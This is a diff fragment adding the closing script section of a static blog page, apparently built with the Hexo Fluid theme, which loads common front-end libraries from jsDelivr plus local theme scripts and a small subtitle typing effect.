+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
